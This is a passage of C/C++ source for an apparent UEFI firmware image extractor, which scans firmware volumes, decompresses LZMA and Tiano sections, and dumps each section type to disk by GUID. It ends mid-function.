#define _CRT_SECURE_NO_WARNINGS 1

#include <windows.h>
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <direct.h>
#include <stddef.h>
#include "lzmadec.h"

#include "UefiTypes.h"
#include "PiFirmwareFile.h"
#include "CommonLib.h"
#include "FvLib.h"
#include "peimage.h"
#include "Tiano/EfiTianoDecompress.h"

#include "macro.h"

#pragma pack(1)
typedef struct _lzma {
	char	Signature1;
	int		dictionarySize;
	__int64	uncompressedSize;
} LZMA_HEADER;
#define diff_pos(ptr, base) (int) (((char *) ptr ) - ((char *)(base)))


void *memmem(void *src, int ssize, void *pattern, int psize)
{
	if (src == NULL || pattern == NULL || ssize == 0 || psize == 0)
		return NULL;

	if (psize > ssize)
		return NULL;

	void *top = CALC_OFFSET(void *, src, ssize - psize);

	while(src < top)
	{
		if (memcmp(src, pattern, psize) == 0)
			return src;

		src = CALC_OFFSET(void *, src, 1);
	}
	
	return src;
}

void *memrmem(void *base, void *src, void *pattern, int psize)
{
	if (base == NULL || src == NULL || pattern == NULL || psize == 0)
		return NULL;

	if (base >= src)
		return NULL;

	if (pattern >= base && pattern < src)
		return pattern;

	while(src >= base)
	{
		if (memcmp(src, pattern, psize) == 0)
			return src;

		src = CALC_OFFSET(void *, src, -1);
	}

	return NULL;

}

void volume_dump(char *outputdir, PEFI_FIRMWARE_VOLUME_HEADER pVolume);

///
/// Common section header.
///
#pragma pack(1)
typedef EFI_COMMON_SECTION_HEADER* PEFI_COMMON_SECTION_HEADER;


#pragma pack(1)
typedef EFI_COMPRESSION_SECTION *PEFI_COMPRESSION_SECTION;

#define MZ_SIGNATURE 0x5a4d
#define FVH_SIGNATURE 0x4856465f

EFI_GUID EndOfGuid = { 0xFFFFFFFF, 0xFFFF, 0xFFFF, { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF } };
EFI_GUID EndOfVolume = { 0xFFF12B8D, 0x7696, 0x4C8B, { 0x85, 0xA9, 0x27, 0x47, 0x07, 0x5B, 0x4F, 0x50 } };
EFI_GUID PadVolume = { 0xFFF12B8D, 0x7696, 0x4C8B, { 0x85, 0xA9, 0x27, 0x47, 0x07, 0x5B, 0x4F, 0x50 } };

void find_lzma(void *buffer, int size);
void* unpack_lzma(void *buffer, int size, int *unpackedsize);

void guid2str(char *szOut, EFI_GUID *guid)
{
	sprintf(szOut, "%08x-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x",
		guid->Data1,
		guid->Data2,
		guid->Data3,
		guid->Data4[0], guid->Data4[1], guid->Data4[2], guid->Data4[3], guid->Data4[4], guid->Data4[5], guid->Data4[6], guid->Data4[7]);

}


const char *extensions[] =
{
	"raw",
	"bmp",
	"pcx",
	"rom",
	"ssdt",
	"table",
	"cer"
};

//////////////////////////////////////////////////////////////////////////
const char *identify(const unsigned char *buffer)
{
	if (buffer[0] == 'B' && buffer[1] == 'M' && buffer[2] == '6')
		return extensions[1];

	if (buffer[0] == 0x0a)	// pcx?
		return extensions[2];

	if (buffer[0] == 0x55 && buffer[1] == 0xaa)
		return extensions[3];

	if (buffer[0] == 0x53 && buffer[1] == 0x53 && buffer[2] == 0x44 && buffer[3] == 0x54)
		return extensions[4];

	if (buffer[0] == '$')
		return extensions[5];

	if (buffer[0] == 0x30 && buffer[buffer[1]] == 0x30)	// two ASN.1 syntax!
		return extensions[6];

	return extensions[0];

}

DWORD efi_ffs_file_size(PEFI_FFS_FILE_HEADER pFile)
{
	return Expand24bit(pFile->Size);
}

void volume_scan(char *outputdir, PEFI_FIRMWARE_VOLUME_HEADER pVolume);

struct _configuration
{
	bool	disk_dump;
};

struct _configuration CONFIG = { true };

/////
void dump_file(char *filename, void *data, int size)
{
	if (CONFIG.disk_dump == false)	// disk dump disabled!
		return;

	FILE *fd = fopen(filename, "wb");

	if (fd != NULL)
	{
		fwrite(data, size, 1, fd);
		fclose(fd);
	}
}

void file_name(char *szFileName, int size, const char* outputdir, const char *filename, const char *ext)
{
	memset(szFileName, 0, size);	// fill with NULl

	sprintf(szFileName, "%s\\%s.%s", outputdir, filename, ext);

	return;

}

//////////////////////////////////////////////////////////////////////////
//
DWORD efi_ffs_section_size(EFI_COMMON_SECTION_HEADER *pSection)
{
	if (Expand24bit(pSection->Size) == 0xffffff)
	{
		return ((EFI_COMMON_SECTION_HEADER2 *)pSection)->ExtendedSize;
	}

	return Expand24bit(pSection->Size);
}

EFI_COMMON_SECTION_HEADER *FirstSection(EFI_FFS_FILE_HEADER *pFile)
{
	if (efi_ffs_file_size(pFile) == 0xffffff)
	{	//
		return reinterpret_cast<EFI_COMMON_SECTION_HEADER *>(reinterpret_cast<char *>(pFile) + sizeof(EFI_FFS_FILE_HEADER2));
	}

	return reinterpret_cast<EFI_COMMON_SECTION_HEADER *>(reinterpret_cast<char *>(pFile) + sizeof(EFI_FFS_FILE_HEADER));
}

EFI_COMMON_SECTION_HEADER *NextSection(EFI_COMMON_SECTION_HEADER *pSection)
{
	DWORD size = efi_ffs_section_size(pSection);
	
	size = size + 0x3 & (-1 << 2);

	if (size == 0)
		return NULL;

	if (pSection->Type == EFI_SECTION_GUID_DEFINED)
	{	// override!
		EFI_GUID_DEFINED_SECTION *pGuidSection = (EFI_GUID_DEFINED_SECTION *) pSection;

		return reinterpret_cast<EFI_COMMON_SECTION_HEADER *>(reinterpret_cast<char *>(pGuidSection) + pGuidSection->DataOffset );
	}
	return reinterpret_cast<EFI_COMMON_SECTION_HEADER *>(reinterpret_cast<char *>(pSection) + size );
}

BOOL IsValidSection(EFI_FFS_FILE_HEADER *pFile, EFI_COMMON_SECTION_HEADER *pSection)
{
	if (pFile == NULL || pSection == NULL)
		return false;

	DWORD eof = efi_ffs_file_size(pFile);

	if (eof == 0xffffff)
		eof = ((EFI_FFS_FILE_HEADER2 *) pFile)->ExtendedSize;	// ExtendedSize field

	UINT begin = (UINT)(reinterpret_cast<void *>(pFile));
	UINT end = (begin + eof) - sizeof(EFI_COMMON_SECTION_HEADER);
	
	if ((UINT)(reinterpret_cast<void *>(pSection)) < end)
	{
		return true;
	}

	return false;
}

EFI_COMMON_SECTION_HEADER* GetSection(EFI_FFS_FILE_HEADER *pFile, EFI_SECTION_TYPE TypeOf)
{
	EFI_COMMON_SECTION_HEADER *pSection = FirstSection(pFile);

	while(IsValidSection(pFile, pSection))
	{
		if (pSection->Type == TypeOf)
			return pSection;

		pSection = NextSection(pSection);
	}

	return NULL;
}

void file_name(char *szFileName, int size, char *outputdir, EFI_FFS_FILE_HEADER *pFile, EFI_SECTION_TYPE type)
{
	char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);
	char filename[80];

	char szFileNameGUID[40];

	guid2str(szFileNameGUID, &pFile->Name);

	if (pSectionFileName == NULL)
		sprintf(filename, "%s",szFileNameGUID);
	else
		sprintf(filename, "%%S", outputdir, (wchar_t *)(pSectionFileName + 4));

	char *ext;

	switch(type)
	{
		case EFI_SECTION_USER_INTERFACE: ext = "unk"; break;
	}

	file_name(szFileName, size, outputdir, filename, ext);

}

PEFI_FIRMWARE_VOLUME_HEADER find_volume(PEFI_FIRMWARE_VOLUME_HEADER pVolume, char *buffer, int size)
{
	int pos = 0;
	if (size <= sizeof(EFI_FIRMWARE_VOLUME_HEADER))
		return NULL;

	if ((char *) pVolume >= ((char *) buffer + size))
		return NULL;

	if (pVolume == NULL)
		pos = 0;
	else
	{
		pos = ((char *) pVolume - (char *) buffer);
		pos += (UINT32) pVolume->FvLength;
	}

	while(pos < size)
	{
		PEFI_FIRMWARE_VOLUME_HEADER pFVH = (PEFI_FIRMWARE_VOLUME_HEADER) &buffer[pos];

		if (pFVH->Signature == FVH_SIGNATURE && memcmp(&pFVH->GUID, &PadVolume, sizeof(EFI_GUID)) == 0)
			return pFVH;	// end of signature!

		if (pFVH->Signature == FVH_SIGNATURE && pFVH->FvLength <= size)
		{

			VerifyFv(pFVH);

			return pFVH;
		}
		else
		{	// move to next block
			pos += 8;
		}
	}

	return NULL;
}

void *tiano_decompress(void *ptr, int size, int *decompressedSize)
{
	UINT8* data = (UINT8 *) ptr;
	UINT32 dataSize = size;
	UINT8* decompressed;
	*decompressedSize = 0;
	UINT8* scratch;
	UINT32 scratchSize = 0;
	EFI_TIANO_HEADER* header = (EFI_TIANO_HEADER *)data;


	 // Check header to be valid
    //if (header->CompSize + sizeof(EFI_TIANO_HEADER) != dataSize)
    //    return NULL;

	// Get info function is the same for both algorithms
	if (ERR_SUCCESS != EfiTianoGetInfo(data, dataSize, (UINT32 *) decompressedSize, &scratchSize))
		return NULL;

    // Allocate memory
	decompressed = (UINT8 *) malloc(*decompressedSize);
	scratch = (UINT8 *) malloc(scratchSize);

	// Decompress section data
	//TODO: separate EFI1.1 from Tiano another way
	// Try Tiano decompression first
	if (ERR_SUCCESS != TianoDecompress(data, dataSize, decompressed, *decompressedSize, scratch, scratchSize)) {
		// Not Tiano, try EFI 1.1
		if (ERR_SUCCESS != EfiDecompress(data, dataSize, decompressed, *decompressedSize, scratch, scratchSize)) {
			free(decompressed);
			free(scratch);
			return NULL;
		}
	}
	return decompressed;
}

void *file_lookup_section(PEFI_FFS_FILE_HEADER pFile, int section_type, int *size)
{
	char *data;
	int file_size;
	PEFI_COMMON_SECTION_HEADER pSection;

	*size = 0;

	file_size = efi_ffs_file_size(pFile);
	
	if (file_size == 0xffffff)
		file_size = ((PEFI_FFS_FILE_HEADER2) pFile)->ExtendedSize;

	pSection = FirstSection(pFile);
	
	while(IsValidSection(pFile, pSection) && pSection != NULL)
	{
		if (pSection->Type == section_type)
		{
			*size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			return data;
		}
		else if (pSection->Type == EFI_SECTION_COMPRESSED)
		{
			EFI_COMPRESSION_SECTION *pCompressedSection = (EFI_COMPRESSION_SECTION *) pSection;

			if (pCompressedSection->CompressionType == EFI_STANDARD_COMPRESSION)
			{
				int decompressedSize = 0;
				void *result = tiano_decompress(CALC_OFFSET(void *, pCompressedSection, sizeof(EFI_COMPRESSION_SECTION)), 
					Expand24bit(pCompressedSection->CommonHeader.Size) - sizeof(EFI_COMPRESSION_SECTION),
					&decompressedSize);

				if (result)
				{	// parse decompressed section!
					if (((EFI_COMMON_SECTION_HEADER *) result)->Type == section_type)
					{
						*size = decompressedSize - sizeof(EFI_COMMON_SECTION_HEADER);
						data = CALC_OFFSET(char *, result, sizeof(EFI_COMMON_SECTION_HEADER));

						return data;
					}

					free(result);
				}
			}

			
		}

		pSection = NextSection(pSection);
	}

	return NULL;
}

// Dump blob
void* blob_dump(char *outputdir, PEFI_FFS_FILE_HEADER pFile)
{	
	char *data = (char *) pFile;
	
	DWORD size = efi_ffs_file_size(pFile);
	bool unpacked = false;

	char szFileNameGUID[40];

	guid2str(szFileNameGUID, &pFile->Name);

	switch(VerifyFfsFile(pFile))
	{
		case -1:
				printf("%s - Checksum invalid!\n", szFileNameGUID);
			break;
		case -2:
				printf("%s - invalid FFS file header checksum Ffs file\n", szFileNameGUID);
			break;
		case -3:
				printf("%s - invalid FFS file checksum Ffs file\n", szFileNameGUID);
			break;
		case -4:
				printf("%s - invalid fixed FFS file header checksum Ffs file", szFileNameGUID);
			break;
		default:
			break;
	}

	if (size == 0xffffff)
	{	// cast as "pFile2"
		PEFI_FFS_FILE_HEADER2 pFile2 = (PEFI_FFS_FILE_HEADER2) pFile;

		size = pFile2->ExtendedSize;
		data += sizeof(EFI_FFS_FILE_HEADER2);	// move pointer to end of "EFI_FFS_FILE_HEADER2"
	}
	else
	{	
		data += sizeof(EFI_FFS_FILE_HEADER);	// move pointer to end of "EFI_FFS_FILE_HEADER"
	}

	// dump MOD!
	if (true)
	{
		char filename[260];

		sprintf(filename, "%s\\%s.%s", outputdir, szFileNameGUID, "mod");

		dump_file(filename, data, size);
	}

	if (pFile->Type == EFI_FV_FILETYPE_RAW)
	{	// what's?
		char filename[260];

		const char *extension = identify((const unsigned char *)data);
		sprintf(filename, "%s\\%s.%s", outputdir, szFileNameGUID, extension);

		dump_file(filename, data, size);
		//std::cout << "Writing " << filename << std::endl;

		return data;
	}

	PEFI_COMMON_SECTION_HEADER pSection = FirstSection(pFile);
	
	
	//while((void *) pNext < pSearchEnd)
	//{
	//	pNext = (PEFI_COMMON_SECTION_HEADER) 
	//		pNext + ((Expand24bit(pNext->Size) + 3) & (-1 << 2));
	//}

	while(IsValidSection(pFile, pSection) && pSection != NULL)
	{
		if (pSection->Type == EFI_SECTION_COMPRESSION)
		{	// compressed section!
			data += sizeof(EFI_COMPRESSION_SECTION);
			size = Expand24bit(pSection->Size);

			int newsize;
			char *undata = (char *) unpack_lzma(data, (int) Expand24bit(pSection->Size), &newsize);

			if (undata != NULL)
			{
				size = (DWORD) newsize;
				unpacked = true;
				printf("Scanning volume\n");
				//volume_scan(outputdir, undata, newsize);
				PEFI_FIRMWARE_VOLUME_HEADER pVol = NULL;

				while((pVol = find_volume(pVol, undata, size)) != NULL)
				{
					printf("Volume at %08x\n", ((char *) pVol - undata));
					volume_scan(outputdir, pVol);
				}

				//			free(data);
			}
			else
			{	// error!
				printf("Error unpacking %s Section.Type == EFI_SECTION_COMPRESSION\n", szFileNameGUID);
				char filename[260];

				char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);
				sprintf(filename, "%s\\%s.exe.bin", outputdir, szFileNameGUID);
				
				dump_file(filename, data, size);
			}

		}
		else if (pSection->Type == EFI_SECTION_PE32)
		{	// data section!
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];
			
			
			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.exe", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.exe", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_GUID_DEFINED)
		{
			EFI_GUID_DEFINED_SECTION *p = (EFI_GUID_DEFINED_SECTION *) pSection;
		}
		else if (pSection->Type == EFI_SECTION_RAW)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.%s", outputdir, szFileNameGUID, identify((const unsigned char *)data));
			else
				sprintf(filename, "%s\\%S", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_PIC)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.pic", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.pic", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_TE)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.exe", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.exe", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_DXE_DEPEX)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.depex", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.depex", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_VERSION)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.ver", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.ver", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_COMPATIBILITY16)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.exe", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.exe", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_FIRMWARE_VOLUME_IMAGE)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.fd", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.fd", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
			// parsing an FD 
			//volume_scan(outputdir, data, size);
		}
		else if (pSection->Type == EFI_SECTION_FREEFORM_SUBTYPE_GUID)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.guid", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.guid", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);
			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_PEI_DEPEX)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.pei", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.pei", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);

			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_SMM_DEPEX)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.smm", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.smm", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);

		//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type == EFI_SECTION_USER_INTERFACE)
		{
			//std::cout << "Skipping EFI_SECTION_USER_INTERFACE" << std::endl;
		//	size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
		//	data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

		//	char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

		//	char filename[260];

		//	if (pSectionFileName == NULL)
		//		sprintf(filename, "%s\\%s.user", outputdir, guid2str(&pFile->Name).c_str());
		//	else
		//		sprintf(filename, "%s\\%S.user", outputdir, (wchar_t *)(pSectionFileName + 4));

		//	FILE *fd = fopen(filename, "wb");
		//	fwrite(data, size, 1, fd);
		//	fclose(fd);
		}
		else if (pSection->Type == 0xff)
		{
			// ignore! alignment
		}
		else if (pSection->Type == 0xf8)
		{
			size = Expand24bit(pSection->Size) - sizeof(EFI_COMMON_SECTION_HEADER);
			data = (char *) pSection + sizeof(EFI_COMMON_SECTION_HEADER);

			char *pSectionFileName = (char *)GetSection(pFile, EFI_SECTION_USER_INTERFACE);

			char filename[260];

			if (pSectionFileName == NULL)
				sprintf(filename, "%s\\%s.raw", outputdir, szFileNameGUID);
			else
				sprintf(filename, "%s\\%S.raw", outputdir, (wchar_t *)(pSectionFileName + 4));

			dump_file(filename, data, size);

			//std::cout << "Writing " << filename << std::endl;
		}
		else if (pSection->Type = 0xf0)
		{	// ignore! alignment
			//std::cout << "" << filename << std::endl;
		}
		else
		{
			//__asm { int 0x03 };
		}

		pSection = NextSection(pSection);

	}



	//if (unpacked)	// free data!
	//	free(data);

	return data;
}

// scan 
void file_scan(char *outputdir, PEFI_FIRMWARE_VOLUME_HEADER pVolume, char *buffer, int size)
{
	int pos=0;

	while(pos < size)
	{
		PEFI_FFS_FILE_HEADER2 pFile = (PEFI_FFS_FILE_HEADER2) &buffer[pos];

		if (memcmp(&pFile->Name, &EndOfGuid, sizeof(EFI_GUID)) == 0)
			break;

		char szFileNameGUID[40];

		guid2str(szFileNameGUID, &pFile->Name);

		DWORD fsize = efi_ffs_file_size((PEFI_FFS_FILE_HEADER) pFile);
		DWORD buffer_size = 0;

		char fdump[256];

		sprintf(fdump, "%s\\%s", outputdir, szFileNameGUID);

		//fsize = 
		//FILE *fd = fopen(fdump, "wb");

		char *pData = (char *) pFile;

		if (fsize == 0x00ffffff)
		{
			pData += sizeof(EFI_FFS_FILE_HEADER2);
		}
		else
		{
			//fwrite(pData + sizeof(EFI_FFS_FILE_HEADER), fsize - sizeof(EFI_FFS_FILE_HEADER), 1, f);
			pData += sizeof(EFI_FFS_FILE_HEADER);
		}

		PEFI_COMMON_SECTION_HEADER pCommonSectionHeader = (PEFI_COMMON_SECTION_HEADER) pData;

		if (pCommonSectionHeader->Type == EFI_SECTION_COMPRESSION)
		{	// Compressed!
			PEFI_COMPRESSION_SECTION pCompressedSection = (PEFI_COMPRESSION_SECTION) pCommonSectionHeader;

			printf("Compressed section: %08x\nUncompress  length: %08x\n        Packed with: %i\n", 
				Expand24bit(pCompressedSection->CommonHeader.Size),
				pCompressedSection->UncompressedLength,
				pCompressedSection->CompressionType);

			pData = pData + sizeof(EFI_COMPRESSION_SECTION);

			int newsize;
			void * newData = unpack_lzma(pData, (int) Expand24bit(pCommonSectionHeader->Size), &newsize);

			if (newData == NULL)
			{
				printf("LZMA decompression error!\n");
			}
			else
			{
				//pData = pData + sizeof(EFI_COMMON_SECTION_HEADER);
				//fwrite(newData, newsize, 1, fd);
				pData = (char *) newData;
				buffer_size = newsize;
			}
		}
		else if (pCommonSectionHeader->Type == EFI_SECTION_PEI_DEPEX)
		{
			buffer_size = fsize;
			pData = pData + sizeof(EFI_COMMON_SECTION_HEADER);
			//fwrite(pData, (int) Expand24bit(pCommonSectionHeader->Size), 1, fd);
		}

		// dump this file!
		//fclose(fd);
		blob_dump(outputdir, (PEFI_FFS_FILE_HEADER) pFile);

		printf("EFI FILE %s at %08x\n", szFileNameGUID, pos);

		// move to next zone
		if ((fsize % 8) == 0)
			pos += fsize;
		else
			pos += (fsize & 0xfffffff8) + 0x08;

		//if (pFile->Attributes & FFS_ATTRIB_TAIL_PRESENT)
		//{	// 
		//	PEFI_FFS_FILE_HEADER2 pFile2 = (PEFI_FFS_FILE_HEADER2) pFile;
//#define IS_FFS_FILE2(x) (PEFI_FFS_FILE_HEADER *) (((x->Attributes) & FFS_ATTRIB_LARGE_FILE) == FFS_ATTRIB_LARGE_FILE)

			//std::cout << " Extended Size: " << pFile->ExtendedSize << std::endl;
		//}
		if ((pFile->Type & EFI_FV_FILETYPE_FIRMWARE_VOLUME_IMAGE) == EFI_FV_FILETYPE_FIRMWARE_VOLUME_IMAGE)
		{
			PEFI_FIRMWARE_VOLUME_HEADER pVol = NULL;

			while((pVol = find_volume(pVol, pData, buffer_size)) != NULL)
			{
				volume_scan(outputdir, pVol);
			}
		}
		else if ((pFile->Type & EFI_FV_FILETYPE_DXE_CORE) == EFI_FV_FILETYPE_DXE_CORE)
		{
			PEFI_FIRMWARE_VOLUME_HEADER pVol = NULL;

			while((pVol = find_volume(pVol, pData, buffer_size)) != NULL)
			{
				volume_scan(outputdir, pVol);
			}
		}
	}
}
PEFI_FFS_FILE_HEADER volume_lookup_byguid(PEFI_FIRMWARE_VOLUME_HEADER pVolume, EFI_GUID *guid)
{
	int pos=0;
	char *buffer = (char *) pVolume;
	PEFI_FFS_FILE_HEADER pLookupFile = NULL;

	pos = pVolume->HeaderLength;	// move on first file!

	while(pos < pVolume->FvLength && pLookupFile == NULL)
	{
		PEFI_FFS_FILE_HEADER2 pFile = (PEFI_FFS_FILE_HEADER2) &buffer[pos];

		if (memcmp(&pFile->Name, guid, sizeof(EFI_GUID)) == 0)
		{	// found file!
			pLookupFile = (PEFI_FFS_FILE_HEADER) pFile;
		}

		if (memcmp(&pFile->Name, &EndOfGuid, sizeof(EFI_GUID)) == 0)
		{
			pos = (int) pVolume->FvLength;
		}
		
		if (efi_ffs_file_size((PEFI_FFS_FILE_HEADER) pFile) == 0xffffff)
		{
			pos += pFile->ExtendedSize;
			if (pFile->ExtendedSize == 0xffffffff)
				break;
		}
		else
			pos += efi_ffs_file_size((PEFI_FFS_FILE_HEADER) pFile);

		if ((pos % 8) != 0)
			pos = (pos & 0xfffffff8) + 0x08;

	}
	return pLookupFile;

}

void volume_scan(char *outputdir, PEFI_FIRMWARE_VOLUME_HEADER pFVH)
{
	if (pFVH->Signature == FVH_SIGNATURE && memcmp(&pFVH->GUID, &PadVolume, sizeof(EFI_GUID)) == 0)
		return;	// end of signature!

	switch(VerifyFv(pFVH))
	{
		case -1: printf("invalid FV header signature\n"); break;
		case -2: printf("invalid FV header checksum\n"); break;
		default: break;
	}

	mFvHeader = pFVH;
	mFvLength = (UINT32) pFVH->FvLength;

	char szFileNameGUID[40];
	guid2str(szFileNameGUID, &pFVH->GUID);

	printf("EFI FIRMWARE VOLUME %s\n\t Length: %08x", szFileNameGUID, (int) pFVH->FvLength);

	char fdir[256];

	sprintf(fdir, "%s\\%s", outputdir, szFileNameGUID);

	_mkdir(fdir);	// create output directory!
	
	char dump_vol[256];
	sprintf(dump_vol, "%s\\%s.fd", outputdir, szFileNameGUID);

	dump_file(dump_vol, pFVH, (int) pFVH->FvLength);

	file_scan(fdir, pFVH, (char *) pFVH + pFVH->HeaderLength, (int) pFVH->FvLength - pFVH->HeaderLength);	// recursive scan!
	volume_dump(fdir, pFVH);
}


void* unpack_lzma(void *buffer, int size, int *unpackedsize)
{
	static const char LZMA_PATTERN[3] = { 0x5d, 0x00, 0x00 };

	char *search = (char *) buffer;

	*unpackedsize = 0;

	if (search[0] == 0x5d && search[0] < 0xe1 && search[4] < 0x20 
		&& (memcmp (search + 10 , "\x00\x00\x00", 3) == 0
		|| (memcmp (search + 5, "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", 8) == 0)))
	{	// found!
		printf("\tLZMA pattern at %08x\n", diff_pos(search, buffer));
		LZMA_HEADER *lzma = (LZMA_HEADER *) search;

		lzmadec_stream strm;
		lzmadec_info info;

		memset(&strm, 0, sizeof(lzmadec_stream));
		memset(&info, 0, sizeof(lzmadec_info));

		lzmadec_init(&strm);
	
		lzmadec_buffer_info(&info, (unsigned char*) search, 13);

		if (info.uncompressed_size == 0)
		{
			*unpackedsize = 0;
			return NULL;
		}

		void *ptr = malloc((int) info.uncompressed_size);

		if (ptr != NULL)
		{
			strm.next_in = (uint8_t *) search;
			strm.avail_in = size;
			strm.next_out = (uint8_t *) ptr;
			strm.avail_out = (size_t) info.uncompressed_size;

			lzmadec_decode(&strm, 1);
		}

		*unpackedsize = (int) info.uncompressed_size;
		return ptr;
	}

	return NULL;
}

typedef struct _VOLUME_STAT
{
	UINT8	FvType;
	UINTN	FvLength;
	UINTN	FvFreeSpace;

} VOLUME_STAT, *PVOLUME_STAT;

void volume_stat(PEFI_FIRMWARE_VOLUME_HEADER pVolume, PVOLUME_STAT pVolStat)
{
	pVolStat->FvFreeSpace = pVolStat->FvLength = pVolume->FvLength;

	char *buffer = (char *) pVolume;

	int pos= pVolume->HeaderLength;

	while(pos < pVolStat->FvLength)
	{
		PEFI_FFS_FILE_HEADER2 pFile = (PEFI_FFS_FILE_HEADER2) &buffer[pos];

